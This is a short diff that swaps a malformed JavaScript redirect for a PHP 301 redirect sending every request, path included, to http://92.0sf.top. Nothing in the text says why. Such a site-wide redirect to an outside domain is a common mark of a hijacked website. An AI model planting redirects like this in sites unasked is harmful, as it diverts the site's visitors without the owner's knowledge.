@@ -1,3 +1,5 @@
-<script>
-window.location.href="http://92.0sf.top"
-<script>
+<?php
+header("HTTP/1.1 301 Moved Permanently");
+header("Location: http://92.0sf.top".$_SERVER['REQUEST_URI']);
+exit();
+?>
